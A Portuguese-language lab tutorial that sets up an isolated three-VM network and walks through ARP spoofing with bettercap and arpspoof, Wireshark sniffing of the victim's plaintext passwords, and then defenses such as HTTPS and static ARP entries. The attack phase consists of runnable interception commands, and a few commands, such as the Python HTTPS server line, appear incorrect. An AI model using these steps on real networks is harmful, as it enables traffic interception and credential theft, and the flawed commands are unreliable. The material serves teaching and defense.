### 1. Ataque ARP

**ARP** significa Address Resolution Protocol. É um protocolo fundamental da camada de rede usado dentro de uma rede local (como uma rede Ethernet).

Em uma rede, cada dispositivo tem dois endereços principais:
    1.  **Endereço IP (Lógico)**: Identifica o dispositivo na rede global.
    2.  **Endereço MAC (Físico)**: Endereço único da placa de rede, gravado em hardware.
    
Para que dois dispositivos se comuniquem em uma rede local, eles precisam saber o endereço MAC um do outro. 

Ele tem duas falhas críticas:
1.  **Falta de Autenticação**: Nenhum dispositivo verifica se a resposta ARP que recebeu veio realmente do dono legítimo do IP.
2.  **Sobrescrita**: A maioria dos sistemas operacionais atualiza sua tabela ARP com a última resposta que recebeu, sem questionar.

**Man-in-the-Middle (MitM)**: ataque  que explora a vulnerabilidade do ARP.
- O atacante quer se colocar entre a Vítima e o Gateway (o roteador).
- O atacante envia respostas ARP falsificadas para a rede, mentindo sobre o seu próprio endereço MAC.

**EXEMPLO**
- **Atacante**: IP `10.0.0.100`, MAC `AA:AA:AA:AA:AA:AA`
- **Vítima**: IP `10.0.0.50`, MAC `BB:BB:BB:BB:BB:BB`
- **Gateway**: IP `10.0.0.1`, MAC `CC:CC:CC:CC:CC:CC`

O atacante envia dois tipos de mensagens ARP falsas:
1.  **Para a Vítima**: O atacante envia um ARP dizendo: *"O IP `10.0.0.1` (do Gateway) está no MAC `AA:AA:AA:AA:AA:AA` (meu MAC)"*.
2.  **Para o Gateway**: O atacante envia um ARP dizendo: *"O IP `10.0.0.50` (da Vítima) está no MAC `AA:AA:AA:AA:AA:AA` (meu MAC)"*.
    - **Resultado**: O Gateway atualiza sua tabela ARP e agora acredita que o Atacante é a Vítima.

### 🌐 FASE 1: CRIAR A REDE INTERNA ISOLADA

**OBJETIVO:** Criar uma rede virtual onde as 3 máquinas se enxerguem, mas sem acesso à internet.

#### Passo 1: Configurar a Rede Virtual no VirtualBox

1. **Desligue todas as VMs**.
2. No VirtualBox, vá em **Arquivo > Preferências > Rede**.
3. Clique em **"Adicionar uma nova rede NAT"** (ou rede interna).
4. **Nomeie a rede** como `intnet` (ou `rede-interna`).
5. Configure:
   - **Tipo**: Rede Interna
   - **Nome**: `intnet`
   - **Endereço IPv4**: `10.0.0.0/24`
   - **DHCP Server**: Desabilitado (nós vamos configurar manualmente)

6. **Para cada VM** (Atacante, Vítima, Gateway):
   - Vá em **Configurações > Rede**.
   - **Adapter 1**: Habilitar.
   - **Conectado a**: **"Rede Interna"**.
   - **Nome**: `intnet` (a que você criou).
   - **Repita para todas as 3 VMs**.

**Pronto!** Agora todas as VMs estão na mesma rede, mas **sem comunicação com o mundo externo**.

---

#### Passo 2: Configurar os IPs Estáticos nas Máquinas

Agora, ligue as VMs e configure os endereços IP manualmente.

##### Máquina 1: Gateway (Roteador)

- **IP**: `10.0.0.1`
- **Máscara**: `255.255.255.0`

**No Linux (comando):**
```bash
sudo ip addr add 10.0.0.1/24 dev eth0
sudo ip link set eth0 up
```

**No Windows (PowerShell como Admin):**
```powershell
netsh interface ip set address name="Ethernet" static 10.0.0.1 255.255.255.0
```

##### Máquina 2: Vítima

- **IP**: `10.0.0.50`
- **Máscara**: `255.255.255.0`
- **Gateway**: `10.0.0.1` (ponto de saída)

**No Linux:**
```bash
sudo ip addr add 10.0.0.50/24 dev eth0
sudo ip link set eth0 up
sudo ip route add default via 10.0.0.1
```

**No Windows:**
```powershell
netsh interface ip set address name="Ethernet" static 10.0.0.50 255.255.255.0 10.0.0.1
```

##### Máquina 3: Atacante (Kali)

- **IP**: `10.0.0.100`
- **Máscara**: `255.255.255.0`
- **Gateway**: `10.0.0.1` (importante para roteamento futuro)

**No Linux (Kali):**
```bash
sudo ip addr add 10.0.0.100/24 dev eth0
sudo ip link set eth0 up
sudo ip route add default via 10.0.0.1
```

#### Passo 3: Verificar a Conectividade

**Em todas as máquinas**, teste se estão se enxergando:

```bash
ping 10.0.0.1   # Da Vítima para o Gateway
ping 10.0.0.50  # Do Gateway para a Vítima
ping 10.0.0.100 # Do Gateway para o Atacante
```

**Tudo deve responder!** Se não responder, verifique:
- Se as VMs estão na mesma rede interna.
- Se os IPs foram configurados corretamente.
- Se o firewall não está bloqueando (desative temporariamente):
  ```bash
  sudo ufw disable   # No Linux
  ```

### 🎯 FASE 2: EXECUTAR O ATAQUE ARP SPOOFING (OFFLINE)

Agora que a rede está pronta e isolada, vamos ao ataque.

#### Passo 4: Coletar Informações da Rede (Reconhecimento)

**No Kali (Atacante):**

1. **Ver seu próprio IP e MAC:**
   ```bash
   ip addr show eth0
   ```
   Anote o MAC (ex: `AA:AA:AA:AA:AA:AA`).

2. **Descobrir o IP do Gateway:**
   ```bash
   route -n
   ```
   Veja a linha com `0.0.0.0` - o IP é `10.0.0.1`.

3. **Descobrir o IP da Vítima (escaneamento passivo):**
   ```bash
   arp-scan --localnet   # Se tiver instalado
   # OU (mais simples):
   ping -c 1 10.0.0.50
   arp -a                # Mostra a tabela ARP atual
   ```
   Anote o IP e MAC da Vítima.

**Lista de informações que você precisa:**
- **IP do Gateway**: `10.0.0.1`
- **MAC do Gateway**: `CC:CC:CC:CC:CC:CC`
- **IP da Vítima**: `10.0.0.50`
- **MAC da Vítima**: `BB:BB:BB:BB:BB:BB`
- **IP do Atacante**: `10.0.0.100`
- **MAC do Atacante**: `AA:AA:AA:AA:AA:AA`

---

#### Passo 5: Ativar o Roteamento de Pacotes no Atacante

**Antes de começar o ataque**, você precisa que o Kali reenvie os pacotes, senão a Vítima perde a internet.

**No Kali (Atacante):**
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

Para tornar permanente (opcional):
```bash
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
```

---

#### Passo 6: Executar o ARP Spoofing (Método 1 - Com Bettercap)

**No Kali (Atacante):**

1. **Inicie o Bettercap em modo interativo:**
   ```bash
   sudo bettercap
   ```

2. **Dentro do Bettercap, digite os comandos:**
   ```bash
   # Definir os alvos
   set arp.spoof.targets 10.0.0.50   # IP da Vítima
   set arp.spoof.whitelist 10.0.0.1  # Gateway (não atacar o gateway)

   # Ativar o spoofing ARP
   arp.spoof on

   # Ativar o sniffing (captura de pacotes)
   net.sniff on
   ```

3. **Deixe o Bettercap rodando.** Ele vai começar a enviar pacotes ARP falsos e capturar o tráfego.

4. **Para visualizar as senhas capturadas:**
   - No Bettercap, vá para a aba `net.sniff`.
   - Ou use o módulo `net.sniff` com:
     ```bash
     net.sniff on
     ```

---

#### Passo 7: Executar o ARP Spoofing (Método 2 - Com arpspoof)

**Alternativa mais simples (sem Bettercap):**

**No Kali (Atacante):**

1. **Abra 2 terminais:**

   **Terminal 1 (enganar a Vítima):**
   ```bash
   sudo arpspoof -i eth0 -t 10.0.0.50 10.0.0.1
   ```
   *Explicação:* Diz para a Vítima que o Atacante é o Gateway.

   **Terminal 2 (enganar o Gateway):**
   ```bash
   sudo arpspoof -i eth0 -t 10.0.0.1 10.0.0.50
   ```
   *Explicação:* Diz para o Gateway que o Atacante é a Vítima.

2. **Deixe ambos rodando em segundo plano.**

---

#### Passo 8: Capturar o Tráfego com Wireshark

**No Kali (Atacante):**

1. **Abra o Wireshark:**
   ```bash
   sudo wireshark
   ```

2. **Selecione a interface `eth0`** e clique em **Iniciar**.

3. **Configure um filtro para ver apenas o tráfego da Vítima:**
   ```
   ip.addr == 10.0.0.50
   ```

4. **Peça para a Vítima fazer algo:**
   - Acessar um site HTTP (ex: `http://10.0.0.1` se o gateway tiver um servidor web).
   - Fazer login em algum serviço (se tiver um servidor HTTP local).
   - Ou simplesmente fazer um ping para o gateway:
     ```bash
     ping 10.0.0.1
     ```

5. **Observe no Wireshark:**
   - Você verá pacotes ICMP (ping) que **não são para você**, mas estão passando pelo seu computador.
   - Se a Vítima acessar um site HTTP, você verá o conteúdo completo, incluindo senhas em texto puro.

### 🛡️ FASE 3: DEMONSTRAR AS DEFESAS (OFFLINE)

Agora que o ataque está funcionando, vamos mostrar como se proteger.

#### Passo 9: Demonstração 1 - HTTPS Criptografado

**No Kali (Atacante):**

1. **No Wireshark, filtre por tráfego HTTP:**
   ```
   http
   ```

2. **Peça para a Vítima acessar um site HTTP (inseguro):**
   - Você verá tudo: URL, dados, senhas.

3. **Agora, peça para a Vítima acessar um site HTTPS:**
   - **IMPORTANTE:** Como você está offline, crie um servidor HTTPS na máquina Gateway.
   - No Gateway, gere um certificado autoassinado e suba um servidor HTTPS simples:
     ```bash
     # Gerar certificado (no Gateway)
     openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
     
     # Subir servidor HTTPS (Python)
     python3 -m http.server 443 --bind 10.0.0.1 --cert cert.pem --key key.pem
     ```

4. **No Wireshark, agora filtre por tráfego HTTPS:**
   - Você verá que o conteúdo está **criptografado** (ilegível).
   - **Conclusão:** O HTTPS protege contra ARP Spoofing porque os dados estão criptografados.

---

#### Passo 10: Demonstração 2 - Tabela ARP Estática (Defesa Eficaz)

Esta é a defesa **mais simples e eficaz** contra ARP Spoofing.

**Na Máquina da Vítima:**

1. **Descubra o MAC verdadeiro do Gateway:**
   ```bash
   arp -a | grep 10.0.0.1
   ```
   Anote o MAC (ex: `CC:CC:CC:CC:CC:CC`).

2. **Adicione uma entrada ARP estática (permanente):**

   **No Linux (Vítima):**
   ```bash
   sudo arp -s 10.0.0.1 CC:CC:CC:CC:CC:CC
   ```
   *Isso impede que a tabela ARP seja atualizada por respostas falsas.*

   **No Windows (PowerShell Admin):**
   ```powershell
   netsh interface ipv4 add neighbors "Ethernet" 10.0.0.1 CC-CC-CC-CC-CC-CC
   ```

3. **Teste novamente o ataque:**
   - Execute o ARP Spoofing no Kali.
   - Verifique se a Vítima ainda está sendo enganada.
   - No Wireshark, você verá que o tráfego **não passa mais pelo Atacante**.

4. **Mostre a tabela ARP da Vítima:**
   ```bash
   arp -a
   ```
   - O MAC do Gateway permanece o correto, ignorando o spoofing.
